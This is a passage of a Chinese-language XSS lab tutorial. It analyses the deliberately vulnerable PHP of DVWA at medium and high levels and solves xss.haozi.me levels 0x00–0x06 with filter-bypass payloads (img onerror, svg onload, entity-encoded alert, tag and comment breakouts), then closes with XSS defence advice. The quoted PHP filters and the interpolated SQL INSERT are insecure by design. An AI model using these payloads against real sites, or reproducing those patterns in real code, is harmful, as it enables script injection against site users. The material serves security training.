    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

代码分析：

- `addslashes()` ：
  - 函数 返回在预定义字符之前添加反斜杠的字符串，
  - 预定义字符 ' 、" 、\ 、NULL

- `strip_tags()` ：
  - 函数 剥去字符串中的 HTML、XML 以及 PHP 的标签

- `htmlspecialchars()`：
  - 函数 把预定义的字符 "<" （小于）、 ">" （大于）、& 、‘’、“” 
  - 转换为 HTML 实体，防止浏览器将其作为HTML元素

虽然 Message 参数把所有的XSS都给过滤了，但是name参数只是过滤了<script>

我们再name参数 上构建payload:

```
<SCRIPT>alert(1)</SCRIPT>
```

注意有长度的限制

![image-20211223150126960](https://gitee.com/xxb667/img/raw/master/img/image-20211223150126960.png)



![image-20211223161135744](https://gitee.com/xxb667/img/raw/master/img/image-20211223161135744.png)

### DOM型XSS

源代码：

```

<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    # Do not allow script tags (不区分大小写)
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}
?>
```

- 先检查了default参数是否为空，
  - 如果不为空则将default等于获取到的default值。
- stripos 用于检测default值中是否有 <script ，
  - 如果有的话，则将 default=English中的English换成下面的payload

构造payload：

```
<img src=1 onerror=alert(1)>
```

*利用  img标签的onerror事件在加载图像的过程中如果发生了错误，就会触发onerror事件执行 JavaScript*

```
http://192.168.81.135/DVWA/vulnerabilities/xss_d/?default=<img src=1 onerror=alert(1)>
```

- 我们查看网页源代码，
- 发现我们的语句被插入到了value值中，
- 但是并没有插入到option标签的值中，
- 所以img标签并没有发起任何作用

![image-20211223150315244](https://gitee.com/xxb667/img/raw/master/img/image-20211223150315244.png)

我们闭合<option> 标签

```
http://192.168.81.135/DVWA/vulnerabilities/xss_d/?default=</option><img src=1 onerror=alert(1)>
```

还是没有成功，我们发现最外层还有个select 标签

![image-20211223150340031](https://gitee.com/xxb667/img/raw/master/img/image-20211223150340031.png)

于是我们继续构造语句去闭合select标签，这下我们的img标签就是独立的一条语句了

```
http://192.168.81.135/DVWA/vulnerabilities/xss_d/?default=</option></select><img src=1 onerror=alert(1)>
```

![image-20211223150402331](https://gitee.com/xxb667/img/raw/master/img/image-20211223150402331.png)

## XSS  DVWA  heigh级别

### DOM型XSS

源码分析：

```
<?php
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
?>
```

白名单策略 插入case字段的相应值，如果不匹配，则插入的是默认的值，所以这个没漏洞。

### 存储型XSS

```

<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}

?>
```

相比前面的medium，只是加上了对<script>关键字的限制，

构建payload：

```
<img src=x onerror=alert('123')>
```

![image-20211223161428580](https://gitee.com/xxb667/img/raw/master/img/image-20211223161428580.png)

### 反射型XSS

源码：

```

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

相比前面的medium，只是加上了对<script>关键字的限制，

构建payload：

```
<img src=x onerror=alert('123')>
```

![image-20211223161519345](https://gitee.com/xxb667/img/raw/master/img/image-20211223161519345.png)

## XSS 攻击小游戏

在线网站：https://xss.haozi.me/#/0x00

如果打不开可以把源代码放到本地，如果你可以打开这个网站那么就不用再安装。

把xss.zip上传到 centos  `/var/www/html`

```
cd /var/www/html
unzip xss.zip
```

在浏览器打开我们的靶场地址：

```
http://192.168.81.135/xss
```

进入靶场随便起个名字,靶场规则 只要能弹窗即可过关。

![image-20211223151542854](https://gitee.com/xxb667/img/raw/master/img/image-20211223151542854.png)

然后进入第一关：

![image-20211223151556676](https://gitee.com/xxb667/img/raw/master/img/image-20211223151556676.png)

### 0x00:

我们看下server code  这一关没有任何过滤

所以我们直接用以下payload 即可过关。

```
<script>alert(1);</script>
```

![image-20211223161929579](https://gitee.com/xxb667/img/raw/master/img/image-20211223161929579.png)

### 0x01:

![image-20211223151749829](https://gitee.com/xxb667/img/raw/master/img/image-20211223151749829.png)

```
<textarea> </textarea>  标签定义多行的文本输入,标签里面的都定义为文本
```

这样就导致我们的JavaScript脚本变成了文本显示，失去了脚本的作用。

解决方案：绕过<textarea> 标签

构造payload：

```
</textarea><script>alert(1);</script>
```

最终的显示结果是：

```
<textarea></textarea><script>alert(1);</script></textarea>
```

分析：因为HTML标签都是成对出现的，我们在前面加一个标签</textarea>闭合 前面的<textarea>

虽然闭合后里面什么都没有，闭合后 后面的</textarea> 怎么办？我们可以不用管，`单身`的标签是不起作用的，也不会影响网页显示效果。

![image-20211223163155873](https://gitee.com/xxb667/img/raw/master/img/image-20211223163155873.png)

### 0x02:

![image-20211223151845540](https://gitee.com/xxb667/img/raw/master/img/image-20211223151845540.png)

我们输入的内容变成了一个值，他是不会被当成JavaScript执行的。

| 值      | 描述               |
| :------ | :----------------- |
| *value* | 发送到服务器的值。 |

构造payload：

```
1"><script>alert(1);</script>
```

显示结果：

```
<input type="name" value="1"><script>alert(1);</script>">
```

分析：我们加了1">  闭合了前面的value， 我们后面的脚本就可以执行，至于后面的的">,由于不是成对出现的。所以不会有任何意义。

![image-20211223163337587](https://gitee.com/xxb667/img/raw/master/img/image-20211223163337587.png)

### 0x03:

![image-20211223152259098](https://gitee.com/xxb667/img/raw/master/img/image-20211223152259098.png)

很明显过滤了/[()]/g 符号

我们的</script>  就没法用，所以要换一种思路。

第一种办法：使用HTML编码绕过

构建payload：

```
<img src=1 onerror="alert&#x28;&#x31;&#x29;&#x3b;">  
#引入外部图片 当图片不存在时，将触发 `onerror`事件


<svg onload=alert&#x28;&#x31;&#x29;&#x3b;>
#SVG 意为矢量图形    onload 事件会图像加载完成后立即发生
    
<body onload=alert&#x28;&#x31;&#x29;&#x3b;>
#onload 事件会在页面加载完成后立即发生
```

由于过滤了（）所以我们用html编码一下，在burpsuite里面的编码器模块，选择HTML编码

![image-20211223153513790](https://gitee.com/xxb667/img/raw/master/img/image-20211223153513790.png)

![image-20211223163434068](https://gitee.com/xxb667/img/raw/master/img/image-20211223163434068.png)



### 0x04:

同上

```
<svg onload=alert&#x28;&#x31;&#x29;&#x3b;>
#SVG 意为矢量图形    onload 事件会图像加载完成后立即发生
```



![image-20211223163515492](https://gitee.com/xxb667/img/raw/master/img/image-20211223163515492.png)

### 0x05:

![image-20211223153720170](https://gitee.com/xxb667/img/raw/master/img/image-20211223153720170.png)

我们输入的JavaScript代码被直接注释掉了  <!-- --> 在HTML里面是注释的意思

我们要想办法绕过注释

如果我们直接闭合前面的注释他会把我们的--替换为 一个表情

如下：

```
!-- 😂<img src=1 onerror="alert&#x28;&#x31;&#x29;&#x3b;">  
 -->
```

构造payload：

```
--!><img src=1 onerror="alert&#x28;&#x31;&#x29;&#x3b;">  
```

分析：在HTML中<!--  --!>  也是可以当作注释

![image-20211223163658223](https://gitee.com/xxb667/img/raw/master/img/image-20211223163658223.png)

### 0x06:

这一关涉及到正则表达式仅作为了解

![image-20211223154318787](https://gitee.com/xxb667/img/raw/master/img/image-20211223154318787.png)

对auto/on开头=结尾的字符及>进行转换为_下划线, 换行可以绕过正则，因为正则只读取一行字符串检测

payload:

```
type="image" src=1 onerror
=alert(1)
```

![image-20211223163730141](https://gitee.com/xxb667/img/raw/master/img/image-20211223163730141.png)

后门涉及到JavaScript正则表达式：

正则表达式教程：https://www.runoob.com/regexp/regexp-tutorial.html

剩余关卡通关教程：

https://blog.51cto.com/u_15274949/2922313

## XSS防御方法：

### 1.防御办法总结：

对于XSS跨站攻击漏洞，可以采用以下修复方式：  

   **总体修复方式：输入端进行过滤，输出端进行编码。**  

#### 总体修复  

具体如下 ：     

##### 1.输入验证：

- 某个数据被接受为可被显示或存储之前，
- 使用标准输入验证机制，
- 验证所有输入数据的长度、类型、语法以及业务规则。     

##### 2.输出编码：

- 数据输出前，
- 确保用户提交的数据已被正确进行编码，
- 建议对所有字符进行编码而不仅局限于某个子集。     

##### 3.明确指定输出的编码方式

-  如UTF-8

##### 4.注意黑名单验证方式的局限性：

- 仅仅查找或替换一些字符(如"<"  ">"或类似"script"的关键字)，
- 很容易被XSS变种攻击绕过验证机制。   

##### 5.警惕规范化错误：

- 验证输入之前，
- 必须进行解码及规范化以符合应用程序当前的内部表示方法。
- 请确定应用程序对同一输入不做两次解码。
- 对客户端提交的数据进行过滤，一般建议过滤掉双引号（”）、尖括号（<、>）等特殊字符，
- 或者对客户端提交的数据中包含的特殊字符进行实体转换，
  - 比如将双引号（”）转换成其实体形式&quot;，<对应的实体形式是`&lt;`     




##### 参考连接：

https://tech.meituan.com/2018/09/27/fe-security.html

### 2.HTML实体编码：

**HTML 实体**

在 HTML 中，某些字符是预留的，例如  `<>" ' &`

在 HTML 中不能使用小于号（<）和大于号（>），这是因为浏览器会误认为它们是标签。

如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）





在HTML中， `<>" ' &`都有特殊意义，HTML标签就是由这几个符号组成，如果直接输出这几个特殊字符，很有可能会被黑客利用造成XSS攻击，一般情况下XSS将这些特殊字符转义。

  PHP 函数 `htmlspecialchars()` 函数可以把一些预定义的字符转换为 HTML 实体。

预定义的字符是：

```
& （和号） 成为 &amp;
" （双引号） 成为 &quot;
' （单引号） 成为 &#039;
< （小于） 成为 &lt;
> （大于） 成为 &gt;
```

#### HTML在线编码

https://c.runoob.com/front-end/691/

